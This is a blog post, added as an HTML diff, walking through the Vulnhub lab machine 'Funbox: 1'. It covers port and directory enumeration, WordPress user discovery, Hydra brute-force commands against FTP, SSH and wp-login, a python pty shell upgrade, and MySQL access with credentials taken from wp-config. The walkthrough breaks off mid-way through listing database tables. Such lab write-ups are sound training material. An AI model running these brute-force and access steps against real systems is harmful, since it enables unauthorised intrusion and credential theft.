@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.85.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Tiago Tavares">
+<meta name="keywords" content="vulnhub, cybersecurity, information security, running, hacking, programming, offensive security, red team">
+<meta name="description" content="Funbox: 1 - A Vulnhub vulnerable machine walkthrough.">
+
+
+<meta property="og:description" content="Funbox: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Funbox: 1 - Vulnhub ">
+<meta name="twitter:title" content="Funbox: 1 - Vulnhub ">
+<meta property="og:url" content="https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+<meta property="twitter:url" content="https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+<meta property="og:site_name" content="debugging the life">
+<meta property="og:description" content="Funbox: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta name="twitter:description" content="Funbox: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2020-08-13T21:40:51">
+  
+  
+    <meta property="article:modified_time" content="2020-08-13T21:40:51">
+  
+  
+  
+    
+      <meta property="article:section" content="📜Walkthroughs">
+    
+      <meta property="article:section" content="👨‍💻Vulnhub">
+    
+  
+  
+    
+      <meta property="article:tag" content="vulnhub">
+    
+      <meta property="article:tag" content="hacking">
+    
+      <meta property="article:tag" content="ctf">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+  <meta name="twitter:site" content="@0xtiago">
+
+
+  <meta name="twitter:creator" content="@0xtiago">
+
+
+
+
+
+
+  <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597086860/blog/funbox_icon_zrrmsr.jpg">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597086860/blog/funbox_icon_zrrmsr.jpg">
+
+
+
+
+
+  <meta property="og:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
+  <meta property="twitter:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
+
+
+    <title>Funbox: 1 - Vulnhub </title>
+
+    <link rel="icon" href="images/favicon-32x32.png">
+    
+
+    
+
+    <link rel="canonical" href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://tiagotavares.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-36987137-3', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://tiagotavares.io/">debugging the life</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://tiagotavares.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=90" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://tiagotavares.io/#about">
+          <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=110" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Tiago Tavares</h4>
+        
+          <h5 class="sidebar-profile-bio">Eternal student, cybersecurity pro, husband, runner.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/0xtiago" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/tiagotvrs/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.strava.com/athletes/tiagotavares" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-heartbeat"></i>
+      
+      <span class="sidebar-button-desc">Strava</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/0xtiago" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://tiagotavares.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      Funbox: 1 - Vulnhub 
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2020-08-13T21:40:51-03:00">
+        
+  August 13, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://tiagotavares.io/categories/walkthroughs">📜Walkthroughs</a>, 
+    
+      <a class="category-link" href="https://tiagotavares.io/categories/vulnhub">👨‍💻Vulnhub</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>Funbox: 1 - A Vulnhub vulnerable machine walkthrough.</p>
+<h1 id="table-of-contents">Table of contents</h1>
+<ul>
+<li><a href="#-enumeration">🔎 Enumeration</a></li>
+<li><a href="#-foothold">🚪🚶 Foothold</a></li>
+<li><a href="#-privilege-escalation">🛡️ Privilege Escalation</a></li>
+<li><a href="#-complete">🍻 Complete</a></li>
+</ul>
+<h1 id="-enumeration">🔎 Enumeration</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -sV -A -O 192.168.0.55
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-10 15:56 -03
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.0.55
+Host is up <span style="color:#f92672">(</span>0.00041s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+|_/secret/
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://funbox.fritz.box/
+|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Device type: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4.37
+OS details: DD-WRT v24-sp2 <span style="color:#f92672">(</span>Linux 2.4.37<span style="color:#f92672">)</span>
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Trying to connect to FTP service with anonymous user. No way&hellip; =(</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# lftp 192.168.0.55
+lftp 192.168.0.55:~&gt; ls
+<span style="color:#e6db74">`</span>ls<span style="color:#960050;background-color:#1e0010">&#39;</span> at <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">530</span> Login incorrect.<span style="color:#f92672">]</span>
+</code></pre></div><p>Let&rsquo;s try HTTP service.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.55/FUZZ
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+
+       v0.12
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.55/FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.htaccess               <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+.htpasswd               <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+robots.txt              <span style="color:#f92672">[</span>Status: 200, Size: 19, Words: 2, Lines: 2<span style="color:#f92672">]</span>
+secret                  <span style="color:#f92672">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+server-status           <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+wp-admin                <span style="color:#f92672">[</span>Status: 301, Size: 315, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+wp-includes             <span style="color:#f92672">[</span>Status: 301, Size: 318, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+wp-content              <span style="color:#f92672">[</span>Status: 301, Size: 317, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+:: Progress: <span style="color:#f92672">[</span>20469/20469<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">553</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:37<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369312/blog/image-20200810155916368_bkubxa.png" alt="image-20200810155916368"></p>
+<p>When I  tried to access http, I had name problems, due the configuration of wordpress. It always converts from the IP to <a href="http://funbox.fritz.box">http://funbox.fritz.box</a>. So, I had to input the site domain on file Linux in hosts file.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369374/blog/image-20200810160707748_mrmuph.png" alt="image-20200810160707748"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">vim /etc/hosts
+</code></pre></div><p>Add funbox.fritz.box</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369373/blog/image-20200810160510533_sywbxl.png" alt="image-20200810160510533"></p>
+<p>Now it`s possible to access the site.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369376/blog/image-20200810160954241_lixhrv.png" alt="image-20200810160954241"></p>
+<p>First thing I do when I reach a Wordpress page, is to enumerate everything with <code>wpscan</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">wpscan -e vp,vt,u --url http://funbox.fritz.box/ 
+</code></pre></div><p>Unfortunately it couldn&rsquo;t find any vulnerable plugin or something, but the users allowed to login, <strong>admin</strong> and <strong>joe</strong>.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811165437522_wy7zgo.png" alt="image-20200811165437522"></p>
+<p>Let`s try some bruteforcing. Our attempts will be on FTP, SSH and Wordpress login page.</p>
+<p>First thing is to create a wordlist based on the site content with <code>cewl</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cewl http://funbox.fritz.box -d <span style="color:#ae81ff">5</span> -m <span style="color:#ae81ff">4</span> -w funbox_wordlist.txt
+</code></pre></div><ul>
+<li>-d  - subdirectories depth</li>
+<li>-m - Minimum word characters.</li>
+</ul>
+<p>We will start our tries with Hydra, in order to make it easier I&rsquo;ll insert both users in a file users.txt</p>
+<p><strong>FTP</strong>: No good results.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra  -V -L users.txt -P funbox_wordlist.txt ftp://192.168.0.55
+</code></pre></div><p><strong>SSH:</strong> No good results.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra  -V -L users.txt -P funbox_wordlist.txt ssh://192.168.0.55
+</code></pre></div><p><strong>Wordpress:</strong> No good results.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra -V -L users.txt -P funbox_wordlist.txt funbox.fritz.box -V http-form-post <span style="color:#e6db74">&#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Ffunbox.fritz.box%2Fwp-admin%2F&amp;testcookie=1:S=Location&#39;</span>
+</code></pre></div><p>This way I&rsquo;ll try to use an small and good external wordlist:</p>
+<p><a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/probable-v2-top1575.txt">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/probable-v2-top1575.txt</a></p>
+<p>Starting from the <strong>Wordpress</strong>, which is faster to crack, we had good results with the user <code>joe</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra -V -L users.txt -P probable-v2-top1575.txt funbox.fritz.box -V http-form-post <span style="color:#e6db74">&#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Ffunbox.fritz.box%2Fwp-admin%2F&amp;testcookie=1:S=Location&#39;</span>
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811171536611_nfi7qy.png" alt="image-20200811171536611"></p>
+<p>Logged with user joe, but without admin permissions. This way is not possible to upload a shell payload.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811171723515_mtijle.png" alt="image-20200811171723515"></p>
+<p>With the same credentials I tried FTP and SSH.</p>
+<p><strong>FTP</strong> ✔️</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# lftp 192.168.0.55
+lftp 192.168.0.55:~&gt; login joe
+Password: 
+lftp joe@192.168.0.55:~&gt; ls
+-rw-------   <span style="color:#ae81ff">1</span> joe      joe           <span style="color:#ae81ff">998</span> Jul <span style="color:#ae81ff">18</span> 09:49 mbox
+lftp joe@192.168.0.55:~&gt; cat mbox
+From root@funbox  Fri Jun <span style="color:#ae81ff">19</span> 13:12:38 <span style="color:#ae81ff">2020</span>
+Return-Path: &lt;root@funbox&gt;
+X-Original-To: joe@funbox
+Delivered-To: joe@funbox
+Received: by funbox.fritz.box <span style="color:#f92672">(</span>Postfix, from userid 0<span style="color:#f92672">)</span>
+	id 2D257446B0; Fri, <span style="color:#ae81ff">19</span> Jun <span style="color:#ae81ff">2020</span> 13:12:38 +0000 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+Subject: Backups
+To: &lt;joe@funbox&gt;
+X-Mailer: mail <span style="color:#f92672">(</span>GNU Mailutils 3.7<span style="color:#f92672">)</span>
+Message-Id: &lt;20200619131238.2D257446B0@funbox.fritz.box&gt;
+Date: Fri, <span style="color:#ae81ff">19</span> Jun <span style="color:#ae81ff">2020</span> 13:12:38 +0000 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+From: root &lt;root@funbox&gt;
+
+Hi Joe, please tell funny the backupscript is <span style="color:#66d9ef">done</span>.
+
+From root@funbox  Fri Jun <span style="color:#ae81ff">19</span> 13:15:21 <span style="color:#ae81ff">2020</span>
+Return-Path: &lt;root@funbox&gt;
+X-Original-To: joe@funbox
+Delivered-To: joe@funbox
+Received: by funbox.fritz.box <span style="color:#f92672">(</span>Postfix, from userid 0<span style="color:#f92672">)</span>
+	id 8E2D4446B0; Fri, <span style="color:#ae81ff">19</span> Jun <span style="color:#ae81ff">2020</span> 13:15:21 +0000 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+Subject: Backups
+To: &lt;joe@funbox&gt;
+X-Mailer: mail <span style="color:#f92672">(</span>GNU Mailutils 3.7<span style="color:#f92672">)</span>
+Message-Id: &lt;20200619131521.8E2D4446B0@funbox.fritz.box&gt;
+Date: Fri, <span style="color:#ae81ff">19</span> Jun <span style="color:#ae81ff">2020</span> 13:15:21 +0000 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+From: root &lt;root@funbox&gt;
+
+Joe, WTF!?!?!?!?!?! Change your password right now! <span style="color:#ae81ff">12345</span> is an recommendation to fire you.
+
+<span style="color:#ae81ff">1028</span> bytes transferred
+
+</code></pre></div><h1 id="-foothold">🚪🚶 Foothold</h1>
+<p>Continuing in the last session, it was possible to login with SSH.</p>
+<p><strong>SSH</strong> ✔️</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# ssh joe@192.168.0.55
+joe@192.168.0.55<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Welcome to Ubuntu 20.04 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-40-generic x86_64<span style="color:#f92672">)</span>
+...
+joe@funbox:~$ ls -lh
+total 4.0K
+-rw------- <span style="color:#ae81ff">1</span> joe joe <span style="color:#ae81ff">998</span> Jul <span style="color:#ae81ff">18</span> 09:49 mbox
+joe@funbox:~$ 
+
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811173222628_d47tz6.png" alt="image-20200811173222628"></p>
+<p>Here we have some limited shell. Due this we need to use python spawn.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811210032280_ynbqlo.png" alt="image-20200811210032280"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">joe@funbox:~$ python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></div><p>Looking at <code>/home</code> directory, we find the funny user folder, which can be find at <code>/etc/passd</code> file.</p>
+<p>In his folder we have a html.tar file. Lets check it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">joe@funbox:/home/funny$ ls -la
+total <span style="color:#ae81ff">47608</span>
+drwxr-xr-x <span style="color:#ae81ff">3</span> funny funny     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span> 10:02 .
+drwxr-xr-x <span style="color:#ae81ff">4</span> root  root      <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">19</span> 11:50 ..
+-rwxrwxrwx <span style="color:#ae81ff">1</span> funny funny       <span style="color:#ae81ff">55</span> Jul <span style="color:#ae81ff">18</span> 10:15 .backup.sh
+-rw------- <span style="color:#ae81ff">1</span> funny funny     <span style="color:#ae81ff">1462</span> Jul <span style="color:#ae81ff">18</span> 10:07 .bash_history
+-rw-r--r-- <span style="color:#ae81ff">1</span> funny funny      <span style="color:#ae81ff">220</span> Feb <span style="color:#ae81ff">25</span> 12:03 .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> funny funny     <span style="color:#ae81ff">3771</span> Feb <span style="color:#ae81ff">25</span> 12:03 .bashrc
+drwx------ <span style="color:#ae81ff">2</span> funny funny     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">19</span> 10:43 .cache
+-rw-rw-r-- <span style="color:#ae81ff">1</span> funny funny <span style="color:#ae81ff">48701440</span> Aug <span style="color:#ae81ff">12</span> 00:38 html.tar
+-rw-r--r-- <span style="color:#ae81ff">1</span> funny funny      <span style="color:#ae81ff">807</span> Feb <span style="color:#ae81ff">25</span> 12:03 .profile
+-rw-rw-r-- <span style="color:#ae81ff">1</span> funny funny      <span style="color:#ae81ff">162</span> Jun <span style="color:#ae81ff">19</span> 14:13 .reminder.sh
+-rw-rw-r-- <span style="color:#ae81ff">1</span> funny funny       <span style="color:#ae81ff">74</span> Jun <span style="color:#ae81ff">19</span> 12:25 .selected_editor
+-rw-r--r-- <span style="color:#ae81ff">1</span> funny funny        <span style="color:#ae81ff">0</span> Jun <span style="color:#ae81ff">19</span> 10:44 .sudo_as_admin_successful
+-rw------- <span style="color:#ae81ff">1</span> funny funny     <span style="color:#ae81ff">7791</span> Jul <span style="color:#ae81ff">18</span> 10:02 .viminfo
+
+</code></pre></div><p>Here we have a backup of wordpress site, including all configuration files.</p>
+<p><code>wp-config.php</code></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200811213401229_cjbysf.png" alt="image-20200811213401229"></p>
+<p>Now we can access MySQL and look at users table.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">
+joe<span style="color:#f92672">@</span>funbox:<span style="color:#f92672">/</span>tmp<span style="color:#960050;background-color:#1e0010">$</span> mysql <span style="color:#f92672">-</span>u wordpress <span style="color:#f92672">-</span>p
+Enter password: 
+Welcome <span style="color:#66d9ef">to</span> the MySQL monitor.  Commands end <span style="color:#66d9ef">with</span> ; <span style="color:#66d9ef">or</span> <span style="color:#960050;background-color:#1e0010">\</span>g.
+Your MySQL connection id <span style="color:#66d9ef">is</span> <span style="color:#ae81ff">3400</span>
+Server version: <span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">21</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>ubuntu0.<span style="color:#ae81ff">20</span>.<span style="color:#ae81ff">04</span>.<span style="color:#ae81ff">4</span> (Ubuntu)
+
+<span style="color:#a6e22e">Copyright</span> (c) <span style="color:#ae81ff">2000</span>, <span style="color:#ae81ff">2020</span>, Oracle <span style="color:#66d9ef">and</span><span style="color:#f92672">/</span><span style="color:#66d9ef">or</span> its affiliates. <span style="color:#66d9ef">All</span> rights reserved.
+
+Oracle <span style="color:#66d9ef">is</span> a registered trademark of Oracle Corporation <span style="color:#66d9ef">and</span><span style="color:#f92672">/</span><span style="color:#66d9ef">or</span> its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span style="color:#e6db74">&#39;help;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> <span style="color:#66d9ef">to</span> clear the current input statement.
+
+mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">databases</span>;
+<span style="color:#f92672">+--------------------+</span>
+<span style="color:#f92672">|</span> <span style="color:#66d9ef">Database</span>           <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------------------+</span>
+<span style="color:#f92672">|</span> information_schema <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wordpress          <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------------------+</span>
+<span style="color:#ae81ff">2</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">02</span> sec)
+
+mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">use</span> wordpress;
+Reading <span style="color:#66d9ef">table</span> information <span style="color:#66d9ef">for</span> completion of <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">column</span> names
+You can turn off this feature <span style="color:#66d9ef">to</span> get a quicker startup <span style="color:#66d9ef">with</span> <span style="color:#f92672">-</span>A
+
+<span style="color:#66d9ef">Database</span> changed
+mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
+<span style="color:#f92672">+-----------------------+</span>
+<span style="color:#f92672">|</span> Tables_in_wordpress   <span style="color:#f92672">|</span>
+<span style="color:#f92672">+-----------------------+</span>
+<span style="color:#f92672">|</span> wp_commentmeta        <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_comments           <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_links              <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> wp_options            <span style="color:#f92672">|</span>
